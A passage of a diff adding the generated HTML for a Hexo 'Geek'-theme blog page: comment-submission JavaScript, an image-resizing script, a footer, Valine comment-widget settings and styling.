+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
